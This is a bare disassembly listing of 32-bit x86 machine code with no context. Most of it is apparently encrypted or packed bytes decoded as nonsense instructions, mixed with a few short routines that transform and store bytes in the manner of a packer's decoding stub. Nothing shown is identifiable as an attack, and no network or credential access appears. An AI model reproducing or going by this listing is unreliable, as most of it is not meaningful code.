  40399d:	sbb    bh,BYTE PTR [edi]
  40399f:	mov    ds:0xa4731a6e,eax
  4039a4:	xor    eax,esi
  4039a6:	xchg   esp,eax
  4039a7:	pop    ecx
  4039a8:	sbb    BYTE PTR [eax-0x47ef1cd5],ch
  4039ae:	addr16 hlt 
  4039b0:	jb     0x403a14
  4039b2:	mov    esi,0x3ad4babe
  4039b7:	imul   edx,DWORD PTR [ecx+0x30dad841],0xc866dfc5
  4039c1:	push   0xe2af3222
  4039c6:	adc    eax,0x3ab41e6a
  4039cb:	or     ebp,DWORD PTR [esi]
  4039cd:	adc    ebx,ebp
  4039cf:	jmp    0x4039d7
  4039d1:	jmp    0xb102d918
  4039d6:	push   esp
  4039d7:	lahf   
  4039d8:	pop    edx
  4039d9:	adc    ah,BYTE PTR [esi+eax*4-0x32]
  4039dd:	push   esp
  4039de:	push   0x3b1df81b
  4039e3:	test   BYTE PTR [ecx],0x1c
  4039e6:	repz dec esi
  4039e8:	punpckhbw mm7,QWORD PTR [esi+0x943f595]
  4039ef:	(bad)  
  4039f0:	mov    esi,0x66f84a68
  4039f5:	cmp    edx,DWORD PTR [eax]
  4039f7:	sbb    ch,al
  4039f9:	dec    eax
  4039fa:	or     BYTE PTR [eax+0x2d],dl
  4039fd:	xchg   ebx,eax
  4039fe:	repnz adc DWORD PTR [esi-0x20867f13],edi
  403a05:	lock add DWORD PTR cs:[esi],esi
  403a09:	(bad)  
  403a0a:	loope  0x403a0f
  403a0c:	pop    ss
  403a0d:	cli    
  403a0e:	mov    ecx,0x5b8c3c5f
  403a13:	cmc    
  403a14:	push   es
  403a15:	icebp  
  403a16:	pop    ss
  403a17:	lahf   
  403a18:	inc    esp
  403a19:	lock cs xor al,0xd1
  403a1d:	and    BYTE PTR [ecx+ebx*4],dl
  403a20:	stc    
  403a21:	xchg   edi,eax
  403a22:	mov    bl,0x40
  403a24:	xchg   esi,eax
  403a25:	xchg   esi,eax
  403a26:	add    esi,DWORD PTR [ebx]
  403a28:	sahf   
  403a29:	sar    DWORD PTR [ecx-0x27],1
  403a2c:	test   eax,0x5c17b0d0
  403a31:	test   DWORD PTR ds:[ecx],ebx
  403a34:	ret    
  403a35:	popf   
  403a36:	xor    eax,0x4b0186f0
  403a3b:	cmp    eax,edi
  403a3d:	stos   BYTE PTR es:[edi],al
  403a3e:	stos   DWORD PTR es:[edi],eax
  403a3f:	jg     0x4039ff
  403a41:	jmp    0xc6bced76
  403a46:	sahf   
  403a47:	cmp    al,BYTE PTR [ebp+0x1f75ed2e]
  403a4d:	jecxz  0x403aa6
  403a4f:	test   BYTE PTR ds:0x58cd82c,bl
  403a55:	call   0x1783:0x4ec7b54d
  403a5c:	inc    ebx
  403a5d:	rcr    BYTE PTR [esi+0xe],0x69
  403a61:	sbb    al,BYTE PTR [ebx]
  403a63:	jo     0x403ab4
  403a65:	jecxz  0x403abb
  403a67:	or     eax,0xed81f76e
  403a6c:	iret   
  403a6d:	push   cs
  403a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a6f:	pop    ds
  403a70:	jmp    0xa61126ae
  403a75:	not    BYTE PTR [ebp-0x2d]
  403a78:	stc    
  403a79:	pop    ebp
  403a7a:	jmp    0x403ab3
  403a7c:	clc    
  403a7d:	inc    ebp
  403a7e:	out    0x72,al
  403a80:	fs push ds
  403a82:	imul   DWORD PTR [edx-0x2d24da27]
  403a88:	inc    ebx
  403a89:	adc    eax,0x6e16349f
  403a8e:	fisttp QWORD PTR [esi+eiz*1-0x5b]
  403a92:	jns    0x403a98
  403a94:	mov    eax,0x8ba2813d
  403a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a9a:	lahf   
  403a9b:	mov    edi,0xa73ab43e
  403aa0:	sbb    ebp,ecx
  403aa2:	test   eax,0x9c3dd470
  403aa7:	sub    bl,BYTE PTR [ebp-0x33]
  403aaa:	fdiv   st,st(4)
  403aac:	scas   eax,DWORD PTR es:[edi]
  403aad:	cmp    eax,edi
  403aaf:	stos   DWORD PTR es:[edi],eax
  403ab0:	cmp    ah,BYTE PTR [edx]
  403ab2:	enter  0x197,0xe5
  403ab6:	ret    
  403ab7:	fdiv   QWORD PTR [edi+0x3611d831]
  403abd:	test   BYTE PTR ds:0x41d6cff7,al
  403ac3:	and    al,0x9d
  403ac5:	pop    eax
  403ac6:	push   cs
  403ac7:	pop    ds
  403ac8:	add    bl,BYTE PTR [ecx+ebp*4+0x32]
  403acc:	xor    ah,dl
  403ace:	arpl   WORD PTR [edi-0x46],si
  403ad1:	adc    bl,bl
  403ad3:	ins    BYTE PTR es:[edi],dx
  403ad4:	retf   
  403ad5:	xor    al,0xf4
  403ad7:	clc    
  403ad8:	ja     0x403af1
  403ada:	push   ebx
  403adb:	push   ecx
  403adc:	jo     0x403a99
  403ade:	mulps  xmm1,XMMWORD PTR [esi+0x29cd513b]
  403ae5:	add    eax,0xdeb50e72
  403aea:	ret    0x54d9
  403aed:	sbb    cl,BYTE PTR [edi-0x80]
  403af0:	mov    al,BYTE PTR [ebp-0x1]
  403af3:	movzx  ecx,WORD PTR ds:0x42e6eb
  403afa:	adc    DWORD PTR ds:0x42fd76,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x33ab0969],esi
  403b3e:	jb     0x403b05
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xc370707d
  403b48:	push   ebp
  403b49:	push   ecx
  403b4a:	out    0xa4,al
  403b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b4d:	jnp    0x403b02
  403b4f:	jmp    FWORD PTR [edi+0x6c]
  403b52:	mov    edx,DWORD PTR [ebp-0x25]
  403b55:	test   BYTE PTR [eax],dh
  403b57:	sbb    DWORD PTR ds:0x5f686422,esp
  403b5d:	push   esi
  403b5e:	imul   edi,edi,0xffffffec
  403b61:	inc    edx
  403b62:	jae    0x403b94
  403b64:	sub    dh,BYTE PTR [edi]
  403b66:	pop    esp
  403b67:	jmp    0x76768e62
  403b6c:	xor    DWORD PTR [ecx+0x34],esp
  403b6f:	repz and DWORD PTR [esi-0x34952f5b],ebx
  403b76:	mov    bl,0x6f
  403b78:	sbb    dl,ch
  403b7a:	mul    DWORD PTR [edx]
  403b7c:	lea    ebp,[esi+0x141e3138]
  403b82:	xor    al,0xe7
  403b84:	out    dx,eax
  403b85:	cwde   
  403b86:	cs repnz std 
  403b89:	jge    0x403bdf
  403b8b:	adc    DWORD PTR ds:0xcfc8536e,ebx
  403b91:	push   esi
  403b92:	or     BYTE PTR [ecx+eax*4],ah
  403b95:	mov    ds:0xd4d5d067,al
  403b9a:	bound  edi,QWORD PTR [edx+0x14]
  403b9d:	leave  
  403b9e:	push   edx
  403b9f:	pop    ebx
  403ba0:	add    eax,0xe49855c4
  403ba5:	xchg   ebx,eax
  403ba6:	push   edi
  403ba7:	sub    ch,BYTE PTR [ebx-0x1a96db10]
  403bad:	jp     0x403b83
  403baf:	sbb    cl,BYTE PTR [edi+0x7e]
  403bb2:	add    eax,0x3ef24a4f
  403bb7:	shl    DWORD PTR [ebx+ebp*1],cl
  403bba:	pop    ebx
  403bbb:	dec    eax
  403bbc:	pop    ebp
  403bbd:	dec    ecx
  403bbe:	daa    
  403bbf:	push   ecx
  403bc0:	push   0xe2847888
  403bc5:	inc    esi
  403bc6:	xchg   edx,eax
  403bc7:	ficomp WORD PTR [ebx+0x6b1c766a]
  403bcd:	fstp   QWORD PTR [eax-0x373de54c]
  403bd3:	int3   
  403bd4:	repnz shl edi,1
  403bd7:	sub    esi,ecx
  403bd9:	or     BYTE PTR [edx-0x2acf248a],0x53
  403be0:	add    al,0x98
  403be2:	outs   dx,BYTE PTR ds:[esi]
  403be3:	cwde   
  403be4:	in     al,dx
  403be5:	add    DWORD PTR [ebx],ecx
  403be7:	pop    es
  403be8:	dec    eax
  403be9:	and    al,0xf2
  403beb:	xchg   ebp,eax
  403bec:	aam    0x3c
  403bee:	iret   
  403bef:	test   BYTE PTR [ebx-0x64],0xf1
  403bf3:	cld    
  403bf4:	mov    edx,0xb5fcdada
  403bf9:	je     0x403c01
  403bfb:	(bad)  
  403bfc:	sub    esi,ebp
  403bfe:	jg     0x403b94
  403c00:	adc    bl,BYTE PTR [esi+0x522c026f]
  403c06:	push   0x4b98060b
  403c0b:	dec    esp
  403c0c:	pop    edi
  403c0d:	xchg   esp,eax
  403c0e:	and    BYTE PTR [edx+eax*8],dh
  403c11:	je     0x403bf7
  403c13:	mov    DWORD PTR [ebp+ecx*8+0x151d0ea1],eax
  403c1a:	(bad)  
  403c1b:	push   ecx
  403c1c:	jp     0x403bdf
  403c1e:	jno    0x403c8e
  403c20:	jne    0x403c56
  403c22:	pop    esi
  403c23:	cmp    BYTE PTR [edx],al
  403c25:	ins    DWORD PTR es:[edi],dx
  403c26:	and    BYTE PTR [edi-0x25],cl
  403c29:	jnp    0x403c99
  403c2b:	(bad)  
  403c2c:	mov    BYTE PTR [esi+esi*4-0x66d0208],cl
  403c33:	jns    0x403c4b
  403c35:	mov    dh,0x15
  403c37:	test   DWORD PTR ds:[eax+0x13],eax
  403c3b:	mov    al,0xd7
  403c3d:	inc    ecx
  403c3e:	push   es
  403c3f:	or     BYTE PTR ds:0x2302cd5,al
  403c45:	int3   
  403c46:	aad    0x9
  403c48:	sub    al,0x0
  403c4a:	bound  edi,QWORD PTR [ebp-0x29]
  403c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c4e:	fcmovnbe st,st(6)
  403c50:	jae    0x403c35
  403c52:	ins    BYTE PTR es:[edi],dx
  403c53:	out    0x14,eax
  403c55:	jg     0x403c1e
  403c57:	pushf  
  403c58:	out    dx,al
  403c59:	adc    edx,DWORD PTR [bx+di+0x422e]
  403c5e:	inc    ebp
  403c5f:	ins    BYTE PTR es:[edi],dx
  403c60:	addr16 test esi,esi
  403c63:	push   cs
  403c64:	adc    bh,0xfe
  403c67:	add    DWORD PTR ds:0x447569c4,edi
  403c6d:	jno    0x403c99
  403c6f:	int3   
  403c70:	inc    ebx
  403c71:	mov    al,ds:0xc908e9ab
  403c76:	mov    ch,0xc2
  403c78:	test   eax,0xc6f0ed69
  403c7d:	jne    0x403c2b
  403c7f:	dec    esp
  403c80:	lods   eax,DWORD PTR ds:[esi]
  403c81:	stc    
  403c82:	dec    esp
  403c83:	int3   
  403c84:	jno    0x403c3f
  403c86:	bound  edi,QWORD PTR [ecx-0x54]
  403c89:	add    BYTE PTR [edi+0x5fb5ddf],dh
  403c8f:	add    bh,bh
  403c91:	pop    ss
  403c92:	sti    
  403c93:	sbb    eax,0x868ffc8
  403c98:	icebp  
  403c99:	jnp    0x403ce8
  403c9b:	dec    esp
  403c9c:	sbb    eax,0x25fc754e
  403ca1:	jae    0x403cb6
  403ca3:	scas   eax,DWORD PTR es:[edi]
  403ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ca5:	and    edi,esp
  403ca7:	pop    edx
  403ca8:	lock mov ?,WORD PTR [ebp+0x95f1458]
  403caf:	push   0x700e9b08
  403cb4:	scas   al,BYTE PTR es:[edi]
  403cb5:	pop    esp
  403cb6:	push   esi
  403cb7:	jge    0x403ca4
  403cb9:	fistp  QWORD PTR ds:0x612cf8d7
  403cbf:	sahf   
  403cc0:	xchg   edx,eax
  403cc1:	retf   
  403cc2:	pop    esp
  403cc3:	inc    esp
  403cc4:	push   ebp
  403cc5:	ret    0x30a8
  403cc8:	repnz lahf 
  403cca:	cmp    BYTE PTR [ebp+0x2af00c78],ch
  403cd0:	ja     0x403cb9
  403cd2:	jbe    0x403cbd
  403cd4:	cli    
  403cd5:	pop    ebp
  403cd6:	dec    edi
  403cd7:	sub    DWORD PTR [edi+ebx*1-0x1e],ebp
  403cdb:	inc    edx
  403cdc:	sub    al,0x8
  403cde:	pop    ecx
  403cdf:	test   BYTE PTR [ebp-0x4dca98d5],cl
  403ce5:	jnp    0x403cd2
  403ce7:	repnz outs dx,BYTE PTR ds:[esi]
  403ce9:	das    
  403cea:	mov    edi,0x1f8071a5
  403cef:	mov    eax,0x2c6a928
  403cf4:	test   BYTE PTR [eax],dh
  403cf6:	scas   eax,DWORD PTR es:[edi]
  403cf7:	pop    ebp
  403cf8:	les    esi,FWORD PTR fs:[edx-0x35c2b851]
  403cff:	ficom  DWORD PTR [edi]
  403d01:	dec    edx
  403d02:	pop    ss
  403d03:	gs sbb eax,0xff243cf
  403d09:	sub    ebx,DWORD PTR [ebx-0x33]
  403d0c:	mov    bl,0xc5
  403d0e:	jne    0x403d7b
  403d10:	jno    0x403cc1
  403d12:	and    dl,BYTE PTR [esi+esi*1]
  403d15:	fnstsw WORD PTR [edi+0x25a45d64]
  403d1b:	mov    edx,DWORD PTR [ebx-0xaa95839]
  403d21:	cmp    al,0xa9
  403d23:	sub    ecx,DWORD PTR [ecx-0x4fd229d9]
  403d29:	xor    DWORD PTR [edi],0xfffffff8
  403d2c:	fsub   DWORD PTR [edx-0x13]
  403d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d30:	mov    edi,0x179b92ce
  403d35:	lods   eax,DWORD PTR ds:[esi]
  403d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d37:	rcr    DWORD PTR [esi+0x4a],0xbd
  403d3b:	outs   dx,DWORD PTR ds:[esi]
  403d3c:	sub    DWORD PTR [esi+0x1e],ecx
  403d3f:	xor    BYTE PTR [ebx],ch
  403d41:	jbe    0x403d86
  403d43:	and    al,0x67
  403d45:	jnp    0x403dc6
  403d47:	pop    esi
  403d48:	xor    al,0x24
  403d4a:	pop    esi
  403d4b:	push   eax
  403d4c:	push   eax
  403d4d:	mov    al,0x24
  403d4f:	push   edx
  403d50:	nop
  403d51:	jno    0x403d6c
  403d53:	sbb    ah,dh
  403d55:	pop    esi
  403d56:	mov    edi,DWORD PTR [eax+0x3487add6]
  403d5c:	xlat   BYTE PTR ds:[ebx]
  403d5d:	xor    eax,0xfa9fca5f
  403d62:	dec    ebx
  403d63:	inc    edi
  403d65:	dec    eax
  403d66:	imul   edx,esp,0xffffffb4
  403d69:	outs   dx,BYTE PTR ds:[esi]
  403d6a:	test   DWORD PTR ds:0x6c800ee3,0x6d5ef19f
  403d74:	fnstsw WORD PTR [edx-0x60bbaf95]
  403d7a:	sub    al,0xdc
  403d7c:	leave  
  403d7d:	test   eax,0xd36aa68a
  403d82:	fsub   QWORD PTR [ecx]
  403d84:	pop    edx
  403d85:	std    
  403d86:	xor    dl,bh
  403d88:	pop    esp
  403d89:	dec    eax
  403d8a:	fwait
  403d8b:	mov    ebp,0x7862be85
  403d90:	sub    ch,cl
  403d92:	sbb    BYTE PTR [ecx-0x64e70cf],cl
  403d98:	dec    esi
  403d99:	rcl    BYTE PTR [edx],cl
  403d9b:	or     DWORD PTR [ebx+0x42],ecx
  403d9e:	les    ebp,FWORD PTR [eax-0x51111405]
  403da4:	ja     0x403dbb
  403da6:	cwde   
  403da7:	adc    al,0xf3
  403da9:	mov    ecx,0x5748256d
  403dae:	stos   DWORD PTR es:[edi],eax
  403daf:	fld    QWORD PTR [eax+ebp*2-0x6f]
  403db3:	pop    ebx
  403db4:	call   0xde5d:0x6ec5e7c2
  403dbb:	push   ecx
  403dbc:	and    BYTE PTR [ecx+0x10],ch
  403dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dc0:	addr16 js 0x403d71
  403dc3:	inc    ebp
  403dc4:	push   0x75605aa7
  403dc9:	shl    BYTE PTR [eax-0x5f],0x3b
  403dcd:	out    dx,eax
  403dce:	mov    ah,0xb6
  403dd0:	loop   0x403d9f
  403dd2:	inc    ebx
  403dd3:	retf   0xe359
  403dd6:	mov    bl,0x9f
  403dd8:	sbb    bh,BYTE PTR [ebp-0x7b]
  403ddb:	xor    DWORD PTR [ecx-0x2d7965c4],ebp
  403de1:	bound  ebx,QWORD PTR [edx+ebp*2]
  403de4:	mov    esp,DWORD PTR [ebx]
  403de6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403de7:	push   edx
  403de8:	jecxz  0x403d6b
  403dea:	sub    BYTE PTR [ecx-0x5ad6ca04],0x8d
  403df1:	sub    DWORD PTR [edx+0xd02cc4c],esi
  403df7:	shl    DWORD PTR [ebp-0x7f],cl
  403dfa:	out    0xed,eax
  403dfc:	mov    ds:0xdee0b9e7,eax
  403e01:	inc    ecx
  403e02:	cmp    BYTE PTR ds:0x26ac6bcd,dl
  403e08:	mov    eax,0x17eafb86
  403e0d:	dec    ebp
  403e0e:	sti    
  403e0f:	int3   
  403e10:	popf   
  403e11:	jmp    0x403e74
  403e13:	ficomp WORD PTR [eax]
  403e15:	ja     0x403e0b
  403e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e18:	mov    ch,0x6d
  403e1a:	aad    0x3c
  403e1c:	and    ebx,esp
  403e1e:	dec    edi
  403e1f:	push   ds
  403e20:	mov    esi,ebx
  403e22:	out    dx,al
  403e23:	lods   al,BYTE PTR ds:[esi]
  403e24:	test   BYTE PTR [edx],ah
  403e26:	dec    ecx
  403e27:	mov    ebp,0xa473f6ea
  403e2c:	mov    dl,0x98
  403e2e:	xor    ebx,ebp
  403e30:	bound  ebx,QWORD PTR [esp+eax*1-0x7d55747f]
  403e37:	xchg   ebx,eax
  403e38:	push   es
  403e39:	(bad)  
  403e3a:	lock aad 0xfa
  403e3d:	scas   al,BYTE PTR es:[edi]
  403e3e:	inc    edx
  403e3f:	pop    esi
  403e40:	(bad)  
  403e41:	xchg   ebx,eax
  403e42:	mov    ecx,0xfaca3a32
  403e47:	ret    
  403e48:	pop    ebx
  403e49:	(bad)  
  403e4a:	dec    esi
  403e4b:	ja     0x403e06
  403e4d:	adc    BYTE PTR [esi-0x8],cl
  403e50:	push   ss
  403e51:	dec    esi
  403e52:	loopne 0x403e29
  403e54:	sbb    eax,0x2fecf227
  403e59:	cmp    BYTE PTR [eax],dh
  403e5b:	fstp   TBYTE PTR [eiz*2-0x311c0cdb]
  403e62:	(bad)  
  403e63:	imul   esp,esp,0xde4cd37e
  403e69:	ror    BYTE PTR [ebx+0x6a85fa45],cl
  403e6f:	icebp  
  403e70:	retf   0xe9fa
  403e73:	mov    cl,0x5b
  403e75:	rcr    BYTE PTR [esi+ebx*4-0x38],1
  403e79:	add    dh,BYTE PTR [ebx-0x59589df6]
  403e7f:	lods   eax,DWORD PTR ds:[esi]
  403e80:	cwde   
  403e81:	adc    cl,BYTE PTR [eax+ecx*2+0x3ab25e58]
  403e88:	call   0xf0860655
  403e8d:	xor    BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x1b961c35
  403eec:	and    DWORD PTR [ebx+0x70701b82],ebx
  403ef2:	cmp    eax,0xa570707d
  403ef7:	out    0x59,al
  403ef9:	mov    eax,0x71adc606
  403efe:	jae    0x403f23
  403f00:	adc    al,0x5f
  403f02:	pop    edi
  403f03:	ds jo  0x403eaf
  403f06:	pop    ss
  403f07:	sti    
  403f08:	imul   dl
  403f0a:	cmp    eax,0xcbf177ad
  403f0f:	mov    ecx,edx
  403f11:	stc    
  403f12:	mov    eax,ds:0x2cb93b20
  403f17:	jmp    0x381ce6fb
  403f1c:	mov    dh,ch
  403f1e:	sub    DWORD PTR [ecx],ebp
  403f20:	and    BYTE PTR [edi],ch
  403f22:	cmp    ebx,DWORD PTR [eax-0x4ff4eea6]
  403f28:	mov    edx,0x4a675b64
  403f2d:	xchg   DWORD PTR [ebp-0x1ae7b02e],esi
  403f33:	in     eax,dx
  403f34:	data16 xor BYTE PTR ds:0xa515e23c,0x6c
  403f3c:	xor    ah,BYTE PTR [edx+0x4d7bd833]
  403f42:	lods   al,BYTE PTR ds:[esi]
  403f43:	mov    ch,0xb2
  403f45:	sub    DWORD PTR [ebx+0x4b],eax
  403f48:	fidivr WORD PTR [ebx]
  403f4a:	outs   dx,DWORD PTR ds:[esi]
  403f4b:	jne    0x403f2e
  403f4d:	out    0xf4,eax
  403f4f:	(bad)  
  403f50:	mov    esi,0x3e40f31a
  403f55:	add    ch,BYTE PTR [esp+edx*1]
  403f58:	hlt    
  403f59:	push   cs
  403f5a:	fs iret 
  403f5c:	push   cs
  403f5d:	jbe    0x403f3d
  403f5f:	pop    eax
  403f60:	arpl   si,dx
  403f62:	cld    
  403f63:	test   esp,esi
  403f65:	arpl   si,sp
  403f67:	or     DWORD PTR [edi+0x2650b2ac],esp
  403f6d:	std    
  403f6e:	mov    ds:0x50a07926,al
  403f73:	push   ds
  403f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f75:	(bad)  
  403f77:	or     ah,BYTE PTR [ebx+0x59]
  403f7a:	sub    bl,al
  403f7c:	je     0x403f0e
  403f7e:	jno    0x403f7f
  403f80:	sub    eax,0xc15a43d7
  403f85:	sub    edx,DWORD PTR [eax+0x32]
  403f88:	imul   esp,ebp,0xa5051aa3
  403f8e:	adc    al,0xfb
  403f90:	retf   0x5aa8
  403f93:	and    BYTE PTR [eax+0x37],al
  403f96:	dec    esi
  403f97:	push   cs
  403f98:	dec    ebx
  403f99:	push   ds
  403f9a:	loop   0x403fc2
  403f9c:	xchg   edi,eax
  403f9d:	out    dx,eax
  403f9e:	xlat   BYTE PTR ds:[ebx]
  403f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa0:	ins    DWORD PTR es:[edi],dx
  403fa1:	sbb    al,0xc4
  403fa3:	fucom  st(2)
  403fa5:	loope  0x403f47
  403fa7:	aaa    
  403fa8:	jmp    0x9635:0xc059039c
  403faf:	or     DWORD PTR [edx],ebp
  403fb1:	jle    0x40400e
  403fb3:	ret    
  403fb4:	pop    ecx
  403fb5:	shl    DWORD PTR [ecx+0x2a8c5ddd],0x69
  403fbc:	lods   al,BYTE PTR ds:[esi]
  403fbd:	mov    dl,0x99
  403fbf:	ret    
  403fc0:	mov    bl,0xb3
  403fc2:	sub    DWORD PTR [edx+eiz*8-0x1c],0xfffffffa
  403fc7:	int3   
  403fc8:	jmp    0x40402a
  403fca:	mov    dl,0x15
  403fcc:	jge    0x403fc1
  403fce:	and    BYTE PTR [ecx+0x6c02a58a],dh
  403fd4:	out    dx,eax
  403fd5:	jb     0x403fea
  403fd7:	retf   
  403fd8:	fs or  cl,bh
  403fdb:	add    al,0xa8
  403fdd:	repnz push 0xedaa3135
  403fe3:	push   edx
  403fe4:	jg     0x404028
  403fe6:	add    ah,ch
  403fe8:	(bad)  
  403fea:	test   BYTE PTR [ecx+0xc3bd775],ch
  403ff0:	or     BYTE PTR [ecx+0x3686291],cl
  403ff6:	ret    
  403ff7:	es jle 0x403fd5
  403ffa:	cmc    
  403ffb:	push   ebp
  403ffc:	jp     0x404066
  403ffe:	test   al,0x20
  404000:	jle    0x403fcd
  404002:	sbb    DWORD PTR [eax],edi
  404004:	pop    esi
  404005:	sahf   
  404006:	stos   DWORD PTR es:[edi],eax
  404007:	rep lods eax,DWORD PTR ds:[esi]
  404009:	ret    
  40400a:	(bad)  
  40400b:	in     al,0xf6
  40400d:	iret   
  40400e:	in     al,0xcd
  404010:	imul   ebp,esi,0x31
  404013:	mov    dh,0x95
  404015:	adc    cl,ah
  404017:	mov    cx,0xdc01
  40401b:	and    al,0xc9
  40401d:	xchg   bl,bh
  40401f:	jp     0x403ffb
  404021:	int    0x45
  404023:	and    al,0x48
  404025:	adc    BYTE PTR [ebx-0x2d9217d4],dl
  40402b:	push   es
  40402c:	cmp    DWORD PTR [edi+0x7a],ecx
  40402f:	xlat   BYTE PTR ds:[ebx]
  404030:	mov    edi,edi
  404032:	sbb    dl,al
  404034:	sar    eax,0x1a
  404037:	ror    DWORD PTR [edx+0xb],1
  40403a:	mov    esi,0x76a0a1ba
  40403f:	(bad)  
  404040:	in     eax,0x3b
  404042:	imul   esp,DWORD PTR [edi+0x24],0x2da6c2ef
  404049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40404a:	int    0x90
  40404c:	mov    dh,BYTE PTR [ecx]
  40404e:	jl     0x404093
  404050:	mov    esp,0x9e408826
  404055:	sbb    esp,DWORD PTR [eax-0x49]
  404058:	sub    BYTE PTR [ebp-0x5f],dh
  40405b:	adc    BYTE PTR [esi-0x74840bb1],0xc0
  404062:	mov    dh,0x36
  404064:	into   
  404065:	mov    ah,0x7a
  404067:	lods   al,BYTE PTR ds:[esi]
  404068:	xchg   edi,eax
  404069:	xchg   esp,eax
  40406a:	mov    cl,0xa3
  40406c:	or     eax,0xf87b62d9
  404071:	out    0x5d,al
  404073:	jle    0x4040b2
  404075:	xchg   ebx,eax
  404076:	stc    
  404077:	add    eax,0x9b74b2dc
  40407c:	add    eax,0xe2fc2442
  404081:	push   esp
  404082:	inc    ebp
  404083:	jmp    0x21af62da
  404088:	stos   BYTE PTR es:[edi],al
  404089:	imul   BYTE PTR [edx-0xc]
  40408c:	xchg   esi,eax
  40408d:	jnp    0x40407e
  40408f:	pop    es
  404090:	retf   
  404091:	sub    BYTE PTR [edx],bh
  404093:	mov    eax,ds:0xd9524235
  404098:	popa   
  404099:	lods   al,BYTE PTR ds:[esi]
  40409a:	mov    ?,WORD PTR [edi+0x48]
  40409d:	adc    al,0xc5
  40409f:	sbb    ah,bl
  4040a1:	(bad)  
  4040a2:	xchg   ebp,eax
  4040a3:	mov    ebx,0xd37af8eb
  4040a8:	cs nop
  4040aa:	cmp    esi,ebp
  4040ac:	scas   eax,DWORD PTR es:[edi]
  4040ad:	(bad)  
  4040ae:	xchg   esp,eax
  4040af:	inc    esi
  4040b0:	out    0xe7,eax
  4040b2:	cmc    
  4040b3:	jb     0x4040cb
  4040b5:	add    ebx,DWORD PTR [edi-0x42ab2650]
  4040bb:	pop    es
  4040bc:	(bad)  
  4040bd:	mov    ebp,0x868e9cdd
  4040c2:	loop   0x4040e6
  4040c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040c6:	cwde   
  4040c7:	shl    DWORD PTR [eax],cl
  4040c9:	xchg   edi,eax
  4040ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040cb:	cmp    edx,DWORD PTR [ecx+0x5947665a]
  4040d1:	inc    eax
  4040d2:	sub    al,0x57
  4040d4:	leave  
  4040d5:	or     ebx,ebx
  4040d7:	mov    edx,DWORD PTR [eax]
  4040d9:	push   ss
  4040da:	leave  
  4040db:	into   
  4040dc:	pop    ecx
  4040dd:	pop    edi
  4040de:	adc    eax,0x2ee4a43a
  4040e3:	lods   al,BYTE PTR ds:[esi]
  4040e4:	cli    
  4040e5:	es jge 0x404102
  4040e8:	cmp    al,0xe7
  4040ea:	push   edi
  4040eb:	lods   eax,DWORD PTR ds:[esi]
  4040ec:	adc    DWORD PTR [edx+0x5de7e664],0x12
  4040f3:	aam    0x2
  4040f5:	mov    dh,dh
  4040f7:	adc    al,0x21
  4040f9:	repz fldenv [ebx+0x6e]
  4040fd:	or     bl,BYTE PTR [edi+eiz*4+0x10]
  404101:	mov    cl,0x43
  404103:	or     esi,DWORD PTR [eiz*1+0x168323af]
  40410a:	repz cli 
  40410c:	dec    edi
  40410d:	mov    cl,0x2f
  40410f:	jg     0x4040bf
  404111:	ret    
  404112:	mov    esi,0x98a7d030
  404117:	adc    esp,DWORD PTR ds:0x1b427547
  40411d:	xchg   edi,eax
  40411e:	pop    ebx
  40411f:	xor    eax,0xc7f59191
  404124:	leave  
  404125:	sbb    eax,0x79b26729
  40412a:	pop    ss
  40412b:	xor    eax,0x1216f2a5
  404130:	scas   eax,DWORD PTR es:[edi]
  404131:	pop    edx
  404132:	jecxz  0x4041ab
  404134:	fdiv   DWORD PTR [ebx-0x4b068266]
  40413a:	shr    bh,0x9f
  40413d:	and    al,0x4e
  40413f:	das    
  404140:	leave  
  404141:	aas    
  404142:	push   0xffffff90
  404144:	js     0x404157
  404146:	add    eax,edi
  404148:	arpl   WORD PTR [edx-0x539815e3],ax
  40414e:	jge    0x404146
  404150:	pop    ss
  404151:	test   al,0x79
  404153:	rcl    DWORD PTR [ebx-0x563fb38c],1
  404159:	repz jno 0x404146
  40415c:	loopne 0x404131
  40415e:	fnstsw WORD PTR [edi+0x6a]
  404161:	pop    edi
